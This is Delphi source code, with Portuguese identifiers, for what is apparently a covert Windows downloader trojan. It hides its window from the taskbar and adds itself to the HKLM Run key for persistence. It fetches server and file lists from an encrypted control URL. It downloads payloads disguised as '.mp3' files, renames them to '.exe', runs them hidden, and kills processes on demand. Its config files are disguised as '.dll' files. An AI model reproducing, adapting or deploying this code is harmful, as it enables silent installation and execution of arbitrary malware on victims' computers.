unit UPrin;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, HTTPApp, httpsend, wininet, ExtCtrls, tlhelp32, URLMon, StdCtrls,
  Registry;

type
  TFPrin = class(TForm)
    TimerIter: TTimer;
    TimerGer: TTimer;
    procedure pPegaServ;
    procedure pPegaArq;
    procedure pPegaLnk;
    procedure install;
    procedure FormCreate(Sender: TObject);
    procedure TimerIterTimer(Sender: TObject);
    procedure TimerGerTimer(Sender: TObject);
  private
  link : String;
  serv, arq, lnk : TStringList;
    { Private declarations }
  public
    { Public declarations }
  end;

var
  FPrin: TFPrin;

implementation

uses UFunc, UStr;

{$R *.dfm}

{ TForm1 }

function DownloadFile(Source, Dest: string): Boolean;
begin
  try
    Result := UrlDownloadToFile(nil, PChar(source), PChar(Dest), 0, nil) = 0;
  except
    Result := False;
  end;
end;

function mataprocesso(proc: string): integer;
const
PROCESS_TERMINATE=$0001;
var
ContinueLoop: BOOL;
FSnapshotHandle: THandle;
FProcessEntry32: TProcessEntry32;
begin
result := 0;

FSnapshotHandle := CreateToolhelp32Snapshot
                   (TH32CS_SNAPPROCESS, 0);
FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
ContinueLoop := Process32First(FSnapshotHandle,
                               FProcessEntry32);

while integer(ContinueLoop) <> 0 do
begin
  if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) =
       UpperCase(proc))
   or (UpperCase(FProcessEntry32.szExeFile) =
       UpperCase(proc))) then
    Result := Integer(TerminateProcess(OpenProcess(PROCESS_TERMINATE, BOOL(0),FProcessEntry32.th32ProcessID), 1)); //Alterei aqui
  ContinueLoop := Process32Next(FSnapshotHandle,
                                FProcessEntry32);
end;

CloseHandle(FSnapshotHandle);
end;


procedure TFPrin.install;
const
  CHAVE_INICIAR = '\Software\Microsoft\Windows\CurrentVersion\Run';
var
  Chave, arq: String;
  Reg: TRegistry;
begin
  arq:=Application.ExeName;
  Reg := TRegistry.Create;
  try
    with Reg do
    begin
      Chave := 'WGer';
      RootKey := HKEY_LOCAL_MACHINE;
      if OpenKey(CHAVE_INICIAR, True) then
      begin
        if OpenKey(CHAVE_INICIAR, True) then
          WriteString(Chave, arq);
        Reg.CloseKey;
      end;
    end;
  finally
    Reg.Free;
  end;
end;

procedure TFPrin.pPegaServ;
var
  linha: string;
begin
   linha:=link+'?op=PegaServ';
   linha := linha;
   HttpGetText(linha, serv);
end;

procedure TFPrin.FormCreate(Sender: TObject);
var s : TStringList;
    i, ac : Integer;
begin
   SetWindowLong(Handle, GWL_EXSTYLE, WS_EX_TOOLWINDOW);
   SetWindowLong(Application.Handle, GWL_EXSTYLE, GetWindowLong(Application.Handle, GWL_EXSTYLE) or WS_EX_TOOLWINDOW and not WS_EX_APPWINDOW);
   left := 5776;
   serv := TStringList.Create;
   arq := TStringList.Create;
   lnk := TSTringList.Create;
   s := TStringList.Create;
   ac:=0;
   if FileExists(ExtractFilePath(Application.ExeName)+'cflnk.dll') then
   begin
     s.LoadFromFile(ExtractFilePath(Application.ExeName)+'\cflnk.dll');
     for i:=1 to s.Count-1 do
     begin
        link:=s.Strings[i];
        pPegaLnk;
        if trim(lnk.Strings[0])='ACHOU' then
        begin
           ac:=1;
           break;
        end;
     end;
     if ac=0 then
       link := Decrypt(sURL);
   end
   else
   begin
     link := Decrypt(sURL);
     pPegaLnk;
   end;
   s.Text:=lnk.Text;
   s.SaveToFile(ExtractFilePath(Application.ExeName)+'cflnk.dll');
   s.Free;
   install;
end;

procedure TFPrin.pPegaArq;
var
  linha: string;
begin
   linha:=link+'?op=PegaArq';
   linha := linha;
   HttpGetText(linha, arq);
end;

procedure TFPrin.TimerIterTimer(Sender: TObject);
begin
   try
      if InternetCheckConnection('http://www.google.com.br',1,0) then
      begin
        TimerGer.Enabled:=true;
      end
      else
         TimerGer.Enabled:=false;
   except
   end;
end;

procedure TFPrin.TimerGerTimer(Sender: TObject);
var s, slv : TStringlist;
    j,i,h  : integer;
    cod1,ver1,arq1,linha, servico : String;
begin
  TimerGer.Enabled:=false;
  TimerIter.Enabled:=false;
  s := TStringList.Create;
  slv := TStringList.Create;
  slv.Clear;
  s.Clear;
  if FileExists(ExtractFilePath(Application.ExeName)+'confx.dll') then
     s.LoadFromFile(ExtractFilePath(Application.ExeName)+'\confx.dll');
  pPegaServ;
  if trim(serv.Strings[0])<>'ACHOU' then
  begin
    TimerIter.Enabled:=true;
    exit;
  end;
  pPegaArq;
  if trim(arq.Strings[0])<>'ACHOU' then
  begin
    TimerIter.Enabled:=true;
    exit;
  end;
  for i:=1 to serv.Count-1 do
  begin
     j:=0;
     linha:=serv.Strings[i];
     servico:=copy(linha,pos(',',linha)+1,length(linha));
     for h:=1 to arq.Count-1 do
     begin
        Application.ProcessMessages;
        linha := arq.Strings[h];
        cod1:=trim(copy(linha,1,pos(',',linha)-1));
        linha:=trim(copy(linha,pos(',',linha)+1,length(linha)));
        arq1:=trim(copy(linha,1,pos(',',linha)-1));
        ver1:=trim(copy(linha,pos(',',linha)+1,length(linha)));
        linha := arq.Strings[h];
        if trim(ver1)<>'DEL' then
        begin
           if trim(slv.Text)='' then
             slv.Add('ACHOU');
           slv.Add(linha);
        end;
        if s.Text<>'' then
        begin
          if pos(linha,s.Text)=0 then
          begin
            if FileExists(ExtractFilePath(Application.ExeName)+'\'+arq1+'.exe') then
            begin
              mataprocesso(arq1+'.exe');
              DeleteFile(ExtractFilePath(Application.ExeName)+'\'+arq1+'.exe');
            end;
            if trim(ver1)<>'DEL' then
            begin
              if DownloadFile(servico+arq1+'.mp3',ExtractFilePath(Application.ExeName)+'\'+arq1+'.exe') then
              begin
                WinExec(pchar(ExtractFilePath(Application.ExeName)+'\'+arq1+'.exe'),sw_hide);
                inc(j);
              end;
            end;
          end;
        end
        else
        begin
          if trim(ver1)<>'DEL' then
          begin
            if DownloadFile(servico+arq1+'.mp3',ExtractFilePath(Application.ExeName)+'\'+arq1+'.exe') then
            begin
              WinExec(pchar(ExtractFilePath(Application.ExeName)+'\'+arq1+'.exe'),sw_hide);
              inc(j);
            end;
          end;
        end;
     end;
     if j>0 then
        break;
  end;
  s.Free;
  if slv.Count>0 then
    slv.SaveToFile(ExtractFilePath(Application.ExeName)+'\confx.dll');
  TimerIter.Enabled:=true;
end;

procedure TFPrin.pPegaLnk;
var
  linha: string;
begin
   linha:=link+'?op=PegaLnk';
   linha := linha;
   HttpGetText(linha, lnk);
end;

end.
